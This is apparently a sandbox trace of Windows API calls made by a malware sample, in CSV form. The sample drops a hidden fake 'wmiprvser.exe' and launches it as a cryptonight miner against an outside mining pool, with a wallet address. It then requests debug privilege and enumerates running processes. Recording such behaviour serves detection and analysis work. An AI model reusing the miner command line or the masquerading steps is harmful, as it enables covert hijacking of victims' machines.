api,arguments,return_value,time
NtAllocateVirtualMemory,0#0#917504#8192#0xffffffff#0#3368#0x01450000#4,0,1542888074.500375
NtFreeVirtualMemory,0xffffffff#3368#851968#0x01450000#32768,0,1542888074.500375
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#3368#0x01520000#4,0,1542888074.500375
GetFileType,0x00000000,0,1542888074.500375
GetFileType,0x00000000,0,1542888074.500375
GetFileType,0x00000000,0,1542888074.500375
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#3368#0x01521000#4,0,1542888074.500375
NtAllocateVirtualMemory,0#0#16384#4096#0xffffffff#0#3368#0x01522000#4,0,1542888074.500375
NtAllocateVirtualMemory,0#0#28672#4096#0xffffffff#0#3368#0x01526000#4,0,1542888074.500375
LdrGetDllHandle,0#KERNEL32#0x760b0000,0,1542888074.500375
LdrGetProcedureAddress,kernel32#0x76106c1e#0#0x760b0000#IsProcessorFeaturePresent,0,1542888074.500375
NtAllocateVirtualMemory,0#0#12288#4096#0xffffffff#0#3368#0x0152d000#4,0,1542888074.500375
SetUnhandledExceptionFilter,,0,1542888074.500375
NtAllocateVirtualMemory,0#0#524288#8192#0xffffffff#0#3368#0x01450000#4,0,1542888074.500375
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#3368#0x01450000#4,0,1542888074.500375
GetCursorPos,279#165,1,1542888074.500375
GetSystemMetrics,11,32,1542888074.500375
GetSystemMetrics,12,32,1542888074.500375
GetSystemMetrics,2,17,1542888074.515375
GetSystemMetrics,3,17,1542888074.515375
SetErrorMode,0,32775,1542888074.515375
SetErrorMode,32775,4,1542888074.515375
LoadStringA,#57344#0x00400000,0,1542888074.515375
SetWindowsHookExA,2220#4294967295#0x00474041#0x00000000,2818701,1542888074.515375
OleInitialize,,0,1542888074.515375
NtAllocateVirtualMemory,0#0#1048576#8192#0xffffffff#0#3368#0x01720000#4,0,1542888074.515375
NtAllocateVirtualMemory,0#0#16384#4096#0xffffffff#0#3368#0x01720000#4,0,1542888074.515375
SetWindowsHookExA,2220#5#0x00470c47#0x00000000,4456969,1542888074.515375
NtClose,0x000000d4,0,1542888074.515375
NtClose,0x000000d8,0,1542888074.515375
NtOpenKey,0x00020019#0x000000d8#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\CustomLocale,0,1542888074.515375
NtQueryValueKey,0x000000d8#1##0##HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\CustomLocale\en-US,3221225524,1542888074.515375
NtClose,0x000000d8,0,1542888074.515375
NtOpenKey,0x00020019#0x000000d8#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\ExtendedLocale,0,1542888074.515375
NtQueryValueKey,0x000000d8#1##0##HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\ExtendedLocale\en-US,3221225524,1542888074.515375
NtClose,0x000000d8,0,1542888074.515375
NtClose,0x000000d8,0,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#3368#0x016ed000#4,0,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
LdrLoadDll,0#0#dwmapi.dll#0x747a0000#dwmapi,0,1542888074.515375
LdrGetProcedureAddress,dwmapi#0x747a1610#0#0x747a0000#DwmIsCompositionEnabled,0,1542888074.515375
GetSystemMetrics,0,800,1542888074.515375
GetSystemMetrics,1,600,1542888074.515375
NtAllocateVirtualMemory,0#0#4096#4096#0xffffffff#0#3368#0x016ee000#4,0,1542888074.515375
FindResourceExW,0#DEFAULT_ICON##14#0x00400000,6532056,1542888074.515375
LoadResource,0x00647140#0x0063abd8#0x00400000,6582592,1542888074.515375
FindResourceExW,0##5##3#0x00400000,6531592,1542888074.515375
LoadResource,0x0064359c#0x0063aa08#0x00400000,6567324,1542888074.515375
FindResourceExW,0#DEFAULT_ICON##14#0x00400000,6532056,1542888074.515375
LoadResource,0x00647140#0x0063abd8#0x00400000,6582592,1542888074.515375
FindResourceExW,0##7##3#0x00400000,6531624,1542888074.515375
LoadResource,0x00644fcc#0x0063aa28#0x00400000,6574028,1542888074.515375
LdrGetDllHandle,0#C:\Users\mag\AppData\Local\Temp\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe#0x00400000,0,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,50,16,1542888074.515375
GetSystemMetrics,12,32,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
GetSystemMetrics,31,21,1542888074.515375
FindFirstFileExW,C:\Program Files\Common Files\Services\wmiprvser.exe#C:\Program Files\Common Files\Services\wmiprvser.exe,4294967295,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#kernel32.dll#0x760b0000#kernel32,0,1542888074.515375
LdrGetProcedureAddress,kernel32#0x760f94c7#0#0x760b0000#GetSystemDirectoryA,0,1542888074.515375
GetSystemDirectoryA,C:\Windows\system32,19,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#kernel32.dll#0x760b0000#kernel32,0,1542888074.515375
LdrGetProcedureAddress,kernel32#0x760fdc65#0#0x760b0000#LoadLibraryA,0,1542888074.515375
LdrLoadDll,0#0#C:\Windows\system32\kernel32.dll#0x760b0000#kernel32,0,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#kernel32.dll#0x760b0000#kernel32,0,1542888074.515375
LdrGetProcedureAddress,kernel32#0x760fcc94#0#0x760b0000#GetProcAddress,0,1542888074.515375
LdrGetProcedureAddress,kernel32#0x760f5476#0#0x760b0000#IsWow64Process,0,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#kernel32.dll#0x760b0000#kernel32,0,1542888074.515375
LdrGetProcedureAddress,kernel32#0x760fd7a0#0#0x760b0000#GetCurrentProcess,0,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.515375
LdrLoadDll,0#0#kernel32.dll#0x760b0000#kernel32,0,1542888074.515375
LdrGetProcedureAddress,kernel32#0x760f5476#0#0x760b0000#IsWow64Process,0,1542888074.515375
NtAllocateVirtualMemory,0#0#36864#4096#0xffffffff#0#3368#0x01724000#4,0,1542888074.515375
NtOpenFile,16417#C:\#0#0x00100000#0x000000e0#1#\??\C:\,0,1542888074.515375
NtQueryInformationFile,9#0x000000e0,0,1542888074.515375
NtClose,0x000000e0,0,1542888074.515375
NtCreateFile,\??\C:\Program Files\Common Files\Services\wmiprvser.exe#96#2#5#C:\Program Files\Common Files\Services\wmiprvser.exe#0#0x40100080#0x000000e0#128,0,1542888074.531375
NtClose,0x000000e0,0,1542888074.531375
SetFileAttributesW,C:\Program Files\Common Files\Services\wmiprvser.exe#C:\Program Files\Common Files\Services\wmiprvser.exe#7,1,1542888074.531375
CreateProcessInternalW,0#1#0#0#2516###C:\Program Files\Common Files\Services\wmiprvser.exe -a cryptonight -o stratum+tcp://etn.4i7i.com:13333 -u etnk4YNUvrWiBBkN9Aq8VP6BKNHezthPTHHzUW3prKgKR4a8hRWqC3aSdZzidGiUuh97jPiwTsik1gD7AcK42xRy16RrgYPfWL -p x --donate-level=1#0x000000e0##1908#0x000000e4,1,1542888074.546375
NtClose,0x000000e0,0,1542888074.546375
NtClose,0x000000e4,0,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32.dll#0x00000000#kernel32,3221225781,1542888074.546375
LdrLoadDll,0#0#kernel32.dll#0x760b0000#kernel32,0,1542888074.546375
LdrGetProcedureAddress,kernel32#0x760fd7b5#0#0x760b0000#GetCurrentProcessId,0,1542888074.546375
LdrLoadDll,0#0#Kernel32.dll#0x760b0000#Kernel32,0,1542888074.546375
LdrGetProcedureAddress,kernel32#0x760f54e7#0#0x760b0000#OpenProcess,0,1542888074.546375
NtOpenProcess,0x000000e4#0x001f0fff#3368,0,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888074.546375
LdrGetProcedureAddress,ADVAPI32#0x77744304#0#0x77730000#OpenProcessToken,0,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888074.546375
LdrGetProcedureAddress,ADVAPI32#0x7774404a#0#0x77730000#LookupPrivilegeValueA,0,1542888074.546375
LookupPrivilegeValueW,SeDebugPrivilege#,1,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888074.546375
LdrGetProcedureAddress,ADVAPI32#0x7774418e#0#0x77730000#AdjustTokenPrivileges,0,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32#0x00000000#kernel32,3221225781,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\kernel32#0x00000000#kernel32,3221225781,1542888074.546375
LdrLoadDll,0#0#kernel32#0x760b0000#kernel32,0,1542888074.546375
LdrGetProcedureAddress,kernel32#0x760fe868#0#0x760b0000#CloseHandle,0,1542888074.546375
NtClose,0x000000e4,0,1542888074.546375
LdrLoadDll,0#0#Kernel32.dll#0x760b0000#Kernel32,0,1542888074.546375
LdrGetProcedureAddress,kernel32#0x760efd29#0#0x760b0000#CreateToolhelp32Snapshot,0,1542888074.546375
CreateToolhelp32Snapshot,2#0,228,1542888074.546375
LdrLoadDll,0#0#Kernel32.dll#0x760b0000#Kernel32,0,1542888074.546375
LdrGetProcedureAddress,kernel32#0x761161ed#0#0x760b0000#Process32First,0,1542888074.546375
Process32FirstW,0x000000e4#0#[System Process],1,1542888074.546375
LdrLoadDll,0#0#Kernel32.dll#0x760b0000#Kernel32,0,1542888074.546375
LdrGetProcedureAddress,kernel32#0x761162b5#0#0x760b0000#Process32Next,0,1542888074.546375
Process32NextW,0x000000e4#4#System,1,1542888074.546375
Process32NextW,0x000000e4#256#smss.exe,1,1542888074.546375
Process32NextW,0x000000e4#324#csrss.exe,1,1542888074.546375
Process32NextW,0x000000e4#360#wininit.exe,1,1542888074.546375
Process32NextW,0x000000e4#372#csrss.exe,1,1542888074.546375
Process32NextW,0x000000e4#412#winlogon.exe,1,1542888074.546375
Process32NextW,0x000000e4#460#services.exe,1,1542888074.546375
Process32NextW,0x000000e4#468#lsass.exe,1,1542888074.546375
Process32NextW,0x000000e4#480#lsm.exe,1,1542888074.546375
Process32NextW,0x000000e4#580#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#660#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#760#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#800#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#832#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#896#audiodg.exe,1,1542888074.546375
Process32NextW,0x000000e4#936#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#992#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#1112#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#1244#spoolsv.exe,1,1542888074.546375
Process32NextW,0x000000e4#1272#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#1408#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#1684#dwm.exe,1,1542888074.546375
Process32NextW,0x000000e4#1856#taskhost.exe,1,1542888074.546375
Process32NextW,0x000000e4#1868#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#1996#explorer.exe,1,1542888074.546375
Process32NextW,0x000000e4#1308#SearchIndexer.exe,1,1542888074.546375
Process32NextW,0x000000e4#2504#cmd.exe,1,1542888074.546375
Process32NextW,0x000000e4#2512#conhost.exe,1,1542888074.546375
Process32NextW,0x000000e4#2648#sppsvc.exe,1,1542888074.546375
Process32NextW,0x000000e4#2684#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#2800#python.exe,1,1542888074.546375
Process32NextW,0x000000e4#3920#WmiPrvSE.exe,1,1542888074.546375
Process32NextW,0x000000e4#2172#TrustedInstaller.exe,1,1542888074.546375
Process32NextW,0x000000e4#2324#svchost.exe,1,1542888074.546375
Process32NextW,0x000000e4#3640#mscorsvw.exe,1,1542888074.546375
Process32NextW,0x000000e4#3240#taskhost.exe,1,1542888074.546375
Process32NextW,0x000000e4#456#python.exe,1,1542888074.546375
Process32NextW,0x000000e4#2584#wsqmcons.exe,1,1542888074.546375
Process32NextW,0x000000e4#3668#sdclt.exe,1,1542888074.546375
Process32NextW,0x000000e4#2752#schtasks.exe,1,1542888074.546375
Process32NextW,0x000000e4#3368#b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe,1,1542888074.546375
Process32NextW,0x000000e4#2388#SearchProtocolHost.exe,1,1542888074.546375
Process32NextW,0x000000e4#3064#conhost.exe,1,1542888074.546375
Process32NextW,0x000000e4#1024#SearchFilterHost.exe,1,1542888074.546375
Process32NextW,0x000000e4#2516#wmiprvser.exe,1,1542888074.546375
Process32NextW,0x000000e4#2500#conhost.exe,1,1542888074.546375
Process32NextW,0x000000e4#2500#寸%הּ崴瞨嵣瞨绔瞫,0,1542888074.546375
NtClose,0x000000e4,0,1542888074.546375
NtOpenProcess,0x00000000#0x00000001#0,3221225483,1542888074.546375
LdrLoadDll,0#0#Kernel32.dll#0x760b0000#Kernel32,0,1542888074.546375
LdrGetProcedureAddress,kernel32#0x760f2c05#0#0x760b0000#TerminateProcess,0,1542888074.546375
NtOpenFile,16417#C:\#0#0x00100000#0x000000e4#1#\??\C:\,0,1542888074.546375
NtQueryInformationFile,9#0x000000e4,0,1542888074.546375
NtClose,0x000000e4,0,1542888074.546375
NtCreateFile,\??\C:\Users\mag\AppData\Local\Temp\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe#96#1#1#C:\Users\mag\AppData\Local\Temp\b25efaffc13c650fe6f1fc951597da63723b138c04af304137c425a3f60bf69a.exe#1#0x80100080#0x000000e4#128,0,1542888074.546375
SetFilePointer,1#0#0x000000e4,0,1542888074.546375
SetFilePointer,2#0#0x000000e4,2314240,1542888074.546375
SetFilePointer,0#0#0x000000e4,0,1542888074.546375
NtAllocateVirtualMemory,0#0#2318336#4096#0xffffffff#0#3368#0x01920000#4,0,1542888074.546375
NtClose,0x000000e4,0,1542888074.546375
NtAllocateVirtualMemory,0#0#2318336#4096#0xffffffff#0#3368#0x01b60000#4,0,1542888074.546375
NtFreeVirtualMemory,0xffffffff#3368#2318336#0x01920000#32768,0,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888074.546375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888074.546375
LdrGetProcedureAddress,ADVAPI32#0x777391dd#0#0x77730000#CryptAcquireContextA,0,1542888074.546375
LdrLoadDll,0#0#CRYPTSP.dll#0x75630000#CRYPTSP,0,1542888074.546375
LdrGetProcedureAddress,CRYPTSP#0x756342a3#0#0x75630000#CryptAcquireContextA,0,1542888074.546375
CryptAcquireContextA,0x00000000#1##0#,0,1542888074.562375
CryptAcquireContextA,0x00255c00#1##8#,1,1542888075.093375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.093375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.093375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888075.093375
LdrGetProcedureAddress,ADVAPI32#0x7773df4e#0#0x77730000#CryptCreateHash,0,1542888075.093375
LdrGetProcedureAddress,CRYPTSP#0x7563556b#0#0x75630000#CryptCreateHash,0,1542888075.093375
CryptCreateHash,0x00000000#0#0x00255c00#0x00008003#0x00255d10,1,1542888075.093375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.093375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.093375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888075.093375
LdrGetProcedureAddress,ADVAPI32#0x7773df36#0#0x77730000#CryptHashData,0,1542888075.093375
LdrGetProcedureAddress,CRYPTSP#0x756357b2#0#0x75630000#CryptHashData,0,1542888075.109375
CryptHashData,0##0x00255d10,1,1542888075.109375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.140375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.140375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888075.140375
LdrGetProcedureAddress,ADVAPI32#0x7773df7e#0#0x77730000#CryptGetHashParam,0,1542888075.140375
LdrGetProcedureAddress,CRYPTSP#0x75635ecc#0#0x75630000#CryptGetHashParam,0,1542888075.140375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\user32.dll#0x00000000#user32,3221225781,1542888075.140375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\user32.dll#0x00000000#user32,3221225781,1542888075.140375
LdrLoadDll,0#0#user32.dll#0x77960000#user32,0,1542888075.140375
LdrGetProcedureAddress,USER32#0x77973c94#0#0x77960000#wvsprintfA,0,1542888075.140375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.140375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.140375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888075.140375
LdrGetProcedureAddress,ADVAPI32#0x7773df66#0#0x77730000#CryptDestroyHash,0,1542888075.140375
LdrGetProcedureAddress,CRYPTSP#0x75635985#0#0x75630000#CryptDestroyHash,0,1542888075.140375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.140375
LdrLoadDll,0#0#C:\Users\mag\AppData\Local\Temp\advapi32.dll#0x00000000#advapi32,3221225781,1542888075.140375
LdrLoadDll,0#0#advapi32.dll#0x77730000#advapi32,0,1542888075.140375
LdrGetProcedureAddress,ADVAPI32#0x7773e124#0#0x77730000#CryptReleaseContext,0,1542888075.140375
LdrGetProcedureAddress,CRYPTSP#0x75632ef0#0#0x75630000#CryptReleaseContext,0,1542888075.140375
NtAllocateVirtualMemory,0#0#45056#4096#0xffffffff#0#3368#0x0026b000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#49152#4096#0xffffffff#0#3368#0x00276000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#139264#4096#0xffffffff#0#3368#0x00282000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#143360#4096#0xffffffff#0#3368#0x002a4000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#430080#4096#0xffffffff#0#3368#0x002c7000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#1048576#8192#0xffffffff#0#3368#0x01a20000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#438272#4096#0xffffffff#0#3368#0x01a20000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#847872#0x00261000#16384,0,1542888075.140375
NtAllocateVirtualMemory,0#0#438272#4096#0xffffffff#0#3368#0x01a8b000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#442368#4096#0xffffffff#0#3368#0x00261000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#1044480#0x01a21000#16384,0,1542888075.140375
NtAllocateVirtualMemory,0#0#446464#4096#0xffffffff#0#3368#0x01a21000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#454656#4096#0xffffffff#0#3368#0x01a8e000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#2097152#8192#0xffffffff#0#3368#0x02070000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#462848#4096#0xffffffff#0#3368#0x02070000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#1044480#0x01a21000#16384,0,1542888075.140375
NtAllocateVirtualMemory,0#0#466944#4096#0xffffffff#0#3368#0x01a21000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#475136#4096#0xffffffff#0#3368#0x01a93000#4,0,1542888075.140375
NtAllocateVirtualMemory,0#0#479232#4096#0xffffffff#0#3368#0x020e1000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#1044480#0x01a21000#16384,0,1542888075.140375
NtAllocateVirtualMemory,0#0#528384#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#2093056#0x02071000#16384,0,1542888075.140375
NtAllocateVirtualMemory,0#0#532480#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#528384#0x01610000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#536576#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#532480#0x02270000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#540672#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#536576#0x01610000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#544768#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#540672#0x02270000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#548864#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#544768#0x01610000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#552960#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#548864#0x02270000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#557056#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#552960#0x01610000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#561152#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#557056#0x02270000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#565248#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#561152#0x01610000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#569344#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#565248#0x02270000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#573440#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#569344#0x01610000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#577536#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#573440#0x02270000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#581632#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#577536#0x01610000#32768,0,1542888075.140375
NtAllocateVirtualMemory,0#0#585728#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.140375
NtFreeVirtualMemory,0xffffffff#3368#581632#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#589824#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#585728#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#593920#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#589824#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#598016#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#593920#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#602112#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#598016#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#606208#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#602112#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#610304#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#606208#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#614400#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#610304#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#618496#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#614400#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#622592#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#618496#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#626688#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#622592#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#630784#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#626688#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#634880#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#630784#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#638976#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#634880#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#647168#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#638976#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#651264#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#647168#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#655360#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#651264#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#659456#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#655360#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#663552#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#659456#0x02270000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#667648#4096#0xffffffff#0#3368#0x02270000#4,0,1542888075.156375
NtFreeVirtualMemory,0xffffffff#3368#663552#0x01610000#32768,0,1542888075.156375
NtAllocateVirtualMemory,0#0#671744#4096#0xffffffff#0#3368#0x01610000#4,0,1542888075.156375
